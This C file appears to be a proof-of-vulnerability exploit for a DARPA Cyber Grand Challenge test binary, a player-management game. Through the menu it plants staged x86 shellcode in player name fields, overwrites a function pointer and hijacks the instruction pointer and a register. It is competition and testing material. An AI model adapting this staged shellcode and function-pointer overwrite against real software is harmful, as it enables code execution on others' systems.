/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libcgc.h>


int write( int fd, void *buffer, size_t count )
{
	size_t written;
    int total_written;
    int retval;

    written = 0;
    total_written = 0;

    while (total_written < count) {
	   retval=transmit(fd, buffer+total_written, count-total_written, &written);

       if (retval != 0)
            return(-1);

       total_written+=written;
    }

	return(count);
}


int receive_bytes (int fd, void *buffer, size_t count) 
{
size_t total;
size_t rxbytes;

    total = 0;

    while(total < count)  {

        rxbytes = 0;

        if (receive(fd, buffer+total, count-total, &rxbytes)==0 ) {

            total += rxbytes;

        }
        
        else {

            return(-1);
        }
    }

	return 0;
}


size_t readline( char *buffer, size_t limit )
{
    size_t len = 0;
    size_t rx = 0;
    char c = 0;

    while( len < limit ) {
        buffer[len] = 0;

        if ( receive( STDIN, &c, 1, &rx ) != 0 ) {
            len = 0;
            goto end;
        }

		if (rx == 0) {
			len = 0;
			goto end;
		}

        if ( c == '\n' ) {
            goto end;
        }

        buffer[len] = c;
        len++;
    }
end:

	buffer[len] = 0;

    return len;
}


int eat_lines(int count)
{
char buffer[1024];
int i;


	for (i=0; i < count; ++i) {

		readline(buffer, sizeof(buffer));

	}

	return 0;

}

int main(void)
{

char line[1000];
int i;
size_t size;
int retval;
unsigned int mask;

int pov_type;
int ip_mask;
int regmask;
int regnum;
int ipvalue;
int regvalue;

unsigned char exploit_buffer[24];

int value;

	pov_type = 1;
	ip_mask = 0xffffffff;
	regmask = 0xffffffff;
	regnum = 1;


	if (write(3, &pov_type, sizeof(pov_type)) == -1)
		_terminate(-1);

	if (write(3, &ip_mask, sizeof(ip_mask)) == -1)
		_terminate(-1);

	if (write(3, &regmask, sizeof(regmask)) == -1)
		_terminate(-1);

	if (write(3, &regnum, sizeof(regnum)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &ipvalue, sizeof(ipvalue)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &regvalue, sizeof(regnum)) == -1)
		_terminate(-1);

	// eat the output of the menu
	eat_lines(6);

	// now add a new player
	write(1, "1\n", 2);

	eat_lines(1);
	// name doesn't matter because its going to be overwritten anyway
	write(1, "a\n", 2);

	eat_lines(1);

	// definitely need it to be a computer player so that the overwritten function pointer gets called
	write(1, "y\n", 2);

	eat_lines(1);

	// doesn't matter which method
	write(1, "1\n", 2);

	// back to the menu
	eat_lines(6);

	
	for (i = 0; i < 24; ++i)
		exploit_buffer[i] = 0;

	// now add a second player to hold the stage two of the shellcode in its player name field
	write(1, "1\n", 2);

	eat_lines(1);

		// exchange EAX and ECX to load ECX with the regnum value

	exploit_buffer[0] = 0x91;

	// now load EAX with what will be the EIP
	exploit_buffer[1] = 0xb8;
	*(int *)(exploit_buffer+2) = ipvalue;


	// do this to ensure that it doesn't have a null or a carriage return
	mask = 0x01010101;

	if (exploit_buffer[2] == 0xff || exploit_buffer[2] == 0x09)
		mask = mask + 0x00000001;

	if (exploit_buffer[3] == 0xff || exploit_buffer[3] == 0x09)
		mask = mask + 0x00000100;

	if (exploit_buffer[4] == 0xff || exploit_buffer[4] == 0x09)
		mask = mask + 0x00010000;

	if (exploit_buffer[5] == 0xff || exploit_buffer[5] == 0x09)
		mask = mask + 0x01000000;
	
	*(int *)(exploit_buffer+2) += mask;

	// now jump to the next part of the shellcode in player 3's name
	exploit_buffer[6] = 0xeb;
	exploit_buffer[7] = 0x28;

	exploit_buffer[8] = 0x0a;

	write(1, exploit_buffer, 9);

	write(1, "y\n1\n", 4);


// now add a third player for the final stage of the shellcode
	write(1, "1\n", 2);

	// subtract the mask that was added to the EIP to make it null safe, etc
	exploit_buffer[0] = 0x2d;

	*(int *)(exploit_buffer+1) = mask;

	// now push it onto the stack
	exploit_buffer[5] = 0x50;

	// and return to get it into EIP
	exploit_buffer[6] = 0xc3;

	exploit_buffer[7] = 0x0a;

	write(1, exploit_buffer, 8);

	eat_lines(1);
	write(1,"y\n",2);

	eat_lines(1);
	write(1,"1\n",2);

	eat_lines(6);

	// now do the part 1 of the shellcode, to include overwriting the function pointer.

	for (i = 0; i < 24; ++i)
		exploit_buffer[i] = 0;

	// selection menu option 4 because it doesn't cause any data to get changed
	exploit_buffer[0] = '4';
	exploit_buffer[1] = 0;

	//load the ECX register with regvalue
	exploit_buffer[4] = 0xb8;
	*( int *)(exploit_buffer+5) = regvalue;

	// do this to make sure the readline isn't terminated by a carriage return or null
	mask = 0x01010101;

	if (exploit_buffer[5] == 0xff || exploit_buffer[5] == 0x09)
		mask = mask + 0x00000001;

	if (exploit_buffer[6] == 0xff || exploit_buffer[6] == 0x09)
		mask = mask + 0x00000100;

	if (exploit_buffer[7] == 0xff || exploit_buffer[7] == 0x09)
		mask = mask + 0x00010000;

	if (exploit_buffer[8] == 0xff || exploit_buffer[8] == 0x09)
		mask = mask + 0x01000000;

	*(int *)(exploit_buffer+5) += mask;

	// subtract the mask back out
	exploit_buffer[9] = 0x2d;
	*( int *)(exploit_buffer+10) = mask;

	// now add a short jump to the second half of the shellcode
	exploit_buffer[14] = 0xeb;
	exploit_buffer[15] = 0x24;


	// overwrite the function pointer to point back to the start of the shellcode
	*(unsigned int *)(exploit_buffer+16) = 0xbaaaae6c;

	// now do the overwrite
	write(1, exploit_buffer, 20);
	write(1, "\n", 1);

	// now "play" a round to cause the function pointer to be dereferenced
	write(1, "3\n", 2);

}

